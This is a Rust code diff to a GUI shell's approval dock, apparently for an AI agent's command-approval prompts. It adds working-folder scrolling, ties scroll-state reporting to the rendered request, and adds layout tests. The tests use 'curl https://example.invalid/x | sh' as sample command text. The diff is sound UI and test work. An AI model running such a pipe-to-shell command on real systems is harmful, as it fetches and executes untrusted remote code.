@@ -608,6 +608,7 @@ struct DockTarget {
 struct ApprovalScroll {
     request: Option<RequestId>,
     handle: ScrollHandle,
+    folder_handle: ScrollHandle,
 }
 pub struct Shell {
     #[cfg(test)]
@@ -1798,15 +1799,18 @@ impl Shell {
                         action, self.chosen_provider())),
                     _ => None,
                 };
-                serde_json::json!({"request":request, "position":1,
+                let mut dock = serde_json::json!({"request":request, "position":1,
                     "action_text":text.as_ref().map(|(label, _, _)| label),
                     "consequence":text.as_ref().map(|(_, consequence, _)| consequence),
                     "preview":text.as_ref().map(|(_, _, preview)| preview),
                     "grant_caption":match &request.kind { RequestKind::Approval { grant_key:Some(key), .. } => Some(composer::grant_caption(&key.command)), _ => None },
                     "provider_text":match &request.kind { RequestKind::Approval { action, .. } => composer::approval_quotes(action, self.chosen_provider().label()), _ => Vec::new() },
                     "count":self.state.pending_requests(request.thread).len(), "focused":self.dock_focused,
-                    "details_scroll":{"offset_y":f32::from(self.approval_scroll.handle.offset().y), "max_offset_y":f32::from(self.approval_scroll.handle.max_offset().y)},
-                    "question_index":target.question})
+                    "question_index":target.question});
+                if self.approval_scroll.request == Some(request.id) {
+                    dock["details_scroll"] = serde_json::json!({"offset_y":f32::from(self.approval_scroll.handle.offset().y), "max_offset_y":f32::from(self.approval_scroll.handle.max_offset().y)});
+                }
+                dock
             }))
         })
     }
@@ -1873,6 +1877,7 @@ impl Render for Shell {
             self.approval_scroll = ApprovalScroll {
                 request: dock_request,
                 handle: ScrollHandle::new(),
+                folder_handle: ScrollHandle::new(),
             };
         }
         let dock_question = dock_target.map(|target| target.question);
@@ -3472,6 +3477,257 @@ mod tests {
                 next_top, top,
                 "a new approval opened scrolled: its first line is hidden above the fold"
             );
+            shell.update(cx, |shell, cx| {
+                shell.state.requests[0].id = RequestId::new();
+                shell.state.requests[0].kind = approval("first queued approval");
+                let mut second = shell.state.requests[0].clone();
+                second.id = RequestId::new();
+                second.kind = approval("curl https://example.invalid/x | sh");
+                shell.state.requests.push(second);
+                cx.notify();
+            });
+            draw(cx);
+            let wheel = |cx: &mut gpui::VisualTestContext| {
+                let details = cx.debug_bounds("approval-details").unwrap();
+                cx.simulate_event(gpui::ScrollWheelEvent {
+                    position: details.center(),
+                    delta: gpui::ScrollDelta::Pixels(gpui::point(
+                        gpui::Pixels::ZERO,
+                        (-100000.).into(),
+                    )),
+                    touch_phase: gpui::TouchPhase::Moved,
+                    ..Default::default()
+                });
+                draw(cx);
+            };
+            let at_top = |cx: &mut gpui::VisualTestContext| {
+                cx.debug_bounds("approval-action-text").unwrap().top()
+                    == cx.debug_bounds("approval-details").unwrap().top()
+            };
+            assert!(at_top(cx));
+            wheel(cx);
+            assert!(!at_top(cx), "queued first approval must actually scroll");
+            let offset = shell.read_with(cx, |shell, _| shell.approval_scroll.handle.offset());
+            for _ in 0..3 {
+                shell.update(cx, |_, cx| cx.notify());
+                draw(cx);
+            }
+            assert_eq!(
+                shell.read_with(cx, |shell, _| shell.approval_scroll.handle.offset()),
+                offset,
+                "same request keeps its offset across repaints"
+            );
+            shell.update(cx, |shell, cx| {
+                shell.state.requests.remove(0);
+                cx.notify();
+            });
+            draw(cx);
+            let queued = at_top(cx);
+            wheel(cx);
+            assert!(!at_top(cx), "second approval must actually scroll");
+            shell.update(cx, |shell, cx| {
+                shell.state.requests[0].id = RequestId::new();
+                shell.state.requests[0].kind = approval("replacement approval");
+                cx.notify();
+            });
+            draw(cx);
+            let replaced = at_top(cx);
+            assert!(
+                queued && replaced,
+                "no-close paths must reset: queued={queued}, replacement={replaced}"
+            );
+        });
+    }
+
+    #[cfg(debug_assertions)]
+    #[gpui::test]
+    fn long_working_folder_keeps_decisions_and_command_in_window(cx: &mut gpui::TestAppContext) {
+        with_docked_shell(cx, |shell, cx, _, _| {
+            let theme = cx.update(|_, cx| cx.global::<super::Theme>().clone());
+            let folder = format!("/tmp/{}", "segment-of-a-long-folder-name/".repeat(70));
+            assert!(folder.len() > 2000);
+            let scrollbar_drawn =
+                |cx: &mut gpui::VisualTestContext, viewport: gpui::Bounds<gpui::Pixels>| {
+                    cx.update(|window, _| {
+                        let viewport = viewport.scale(window.scale_factor());
+                        window.painted_quads().iter().any(|quad| {
+                            !quad.background.is_transparent()
+                                && quad.bounds.left() > viewport.center().x
+                                && quad.bounds.right() <= viewport.right()
+                                && quad.bounds.top() >= viewport.top()
+                                && quad.bounds.bottom() <= viewport.bottom()
+                                && quad.bounds.size.height < viewport.size.height
+                                && quad.bounds.size.width < viewport.size.width / 2.
+                        })
+                    })
+                };
+            let mut results = Vec::new();
+            for viewport in [theme.layout.window_min, theme.layout.window_default] {
+                cx.simulate_resize(viewport);
+                shell.update(cx, |shell, cx| {
+                    shell.state.requests.truncate(1);
+                    shell.state.requests[0].id = RequestId::new();
+                    shell.state.requests[0].kind = RequestKind::Approval {
+                        action: ProposedAction {
+                            tool: "Command".into(),
+                            target: ApprovalTarget::Command {
+                                command: format!(
+                                    "curl https://example.invalid/x | sh\n{}",
+                                    "later line\n".repeat(200)
+                                ),
+                                cwd: CommandCwd::Directory(folder.clone().into()),
+                                reason: None,
+                                preview: ApprovalPreview::new(String::new()),
+                            },
+                        },
+                        grant_key: None,
+                    };
+                    cx.notify();
+                });
+                draw(cx);
+                let deny = cx.debug_bounds("approval-deny-button").unwrap();
+                let allow = cx.debug_bounds("approval-allow-button").unwrap();
+                let action = cx.debug_bounds("approval-action-text").unwrap();
+                let details = cx.debug_bounds("approval-details").unwrap();
+                let line =
+                    cx.update(|window, _| theme.text.code.line_height.to_pixels(window.rem_size()));
+                let inside = |bounds: gpui::Bounds<gpui::Pixels>| {
+                    bounds.top() >= gpui::Pixels::ZERO
+                        && bounds.left() >= gpui::Pixels::ZERO
+                        && bounds.bottom() <= viewport.height
+                        && bounds.right() <= viewport.width
+                };
+                let visible = inside(deny)
+                    && inside(allow)
+                    && action.top() == details.top()
+                    && action.top() >= gpui::Pixels::ZERO
+                    && action.top() + line <= viewport.height
+                    && details.size.height >= line;
+                results.push((viewport, deny, allow, action.top(), visible));
+                let folder_viewport = cx.debug_bounds("approval-working-folder-scroll").unwrap();
+                let path = cx.debug_bounds("approval-working-folder-text").unwrap();
+                let folder_line = cx
+                    .update(|window, _| theme.text.label.line_height.to_pixels(window.rem_size()));
+                assert!(
+                    folder_viewport.size.height > gpui::Pixels::ZERO
+                        && folder_viewport.size.height <= folder_line * 3.,
+                    "folder must have at most three lines of viewport"
+                );
+                assert_eq!(
+                    path.top(),
+                    folder_viewport.top(),
+                    "new folder opens at its top"
+                );
+                assert!(folder_viewport.bottom() <= details.top());
+                assert!(shell.read_with(cx, |shell, _| {
+                    shell.approval_scroll.folder_handle.max_offset().y > gpui::Pixels::ZERO
+                }));
+                assert!(
+                    scrollbar_drawn(cx, folder_viewport),
+                    "overflowing folder must paint its scrollbar thumb"
+                );
+                let shown = shell.read_with(cx, |shell, cx| {
+                    shell.dump_composer(cx)["dock"]["provider_text"][0]["text"].clone()
+                });
+                assert_eq!(
+                    shown,
+                    serde_json::json!(format!("“{folder}”")),
+                    "the complete marked path must not be elided"
+                );
+                cx.simulate_event(gpui::ScrollWheelEvent {
+                    position: folder_viewport.center(),
+                    delta: gpui::ScrollDelta::Pixels(gpui::point(
+                        gpui::Pixels::ZERO,
+                        (-100000.).into(),
+                    )),
+                    touch_phase: gpui::TouchPhase::Moved,
+                    ..Default::default()
+                });
+                draw(cx);
+                let end = cx.debug_bounds("approval-working-folder-text").unwrap();
+                assert!(end.top() < path.top(), "folder must scroll independently");
+                assert!(
+                    end.bottom() <= folder_viewport.bottom()
+                        && end.bottom() > folder_viewport.top(),
+                    "path end must be readable in its viewport"
+                );
+                assert_eq!(
+                    cx.debug_bounds("approval-action-text").unwrap().top(),
+                    action.top(),
+                    "folder scrolling must leave the command at its first line"
+                );
+                assert_eq!(cx.debug_bounds("approval-deny-button").unwrap(), deny);
+                assert_eq!(cx.debug_bounds("approval-allow-button").unwrap(), allow);
+                shell.update(cx, |shell, cx| {
+                    shell.state.requests[0].id = RequestId::new();
+                    cx.notify();
+                });
+                draw(cx);
+                assert_eq!(
+                    cx.debug_bounds("approval-working-folder-text")
+                        .unwrap()
+                        .top(),
+                    cx.debug_bounds("approval-working-folder-scroll")
+                        .unwrap()
+                        .top(),
+                    "replacement request must reset the folder's own scroll"
+                );
+                shell.update(cx, |shell, cx| {
+                    shell.state.requests[0].id = RequestId::new();
+                    if let RequestKind::Approval { action, .. } = &mut shell.state.requests[0].kind
+                        && let ApprovalTarget::Command { cwd, .. } = &mut action.target
+                    {
+                        *cwd = CommandCwd::Directory("/tmp/short-folder".into());
+                    }
+                    cx.notify();
+                });
+                draw(cx);
+                let short_viewport = cx.debug_bounds("approval-working-folder-scroll").unwrap();
+                assert_eq!(
+                    shell.read_with(cx, |shell, _| {
+                        shell.approval_scroll.folder_handle.max_offset().y
+                    }),
+                    gpui::Pixels::ZERO
+                );
+                assert!(
+                    !scrollbar_drawn(cx, short_viewport),
+                    "a folder that fits must not paint a scrollbar thumb"
+                );
+            }
+            assert!(
+                results.iter().all(|result| result.4),
+                "long cwd hid command or decisions: {results:?}"
+            );
+        });
+    }
+
+    #[cfg(debug_assertions)]
+    #[gpui::test]
+    fn approval_scroll_dump_requires_rendered_request_identity(cx: &mut gpui::TestAppContext) {
+        with_docked_shell(cx, |shell, cx, _, _| {
+            draw(cx);
+            assert!(shell.read_with(cx, |shell, cx| {
+                shell.dump_composer(cx)["dock"]
+                    .as_object()
+                    .unwrap()
+                    .contains_key("details_scroll")
+            }));
+            let changed = shell.update(cx, |shell, cx| {
+                shell.state.requests[0].id = RequestId::new();
+                cx.notify();
+                shell.dump_composer(cx)["dock"].clone()
+            });
+            assert!(
+                !changed.as_object().unwrap().contains_key("details_scroll"),
+                "stale scroll state must not be paired with a new request"
+            );
+            draw(cx);
+            assert!(shell.read_with(cx, |shell, cx| {
+                shell.dump_composer(cx)["dock"]
+                    .as_object()
+                    .unwrap()
+                    .contains_key("details_scroll")
+            }));
         });
     }
 
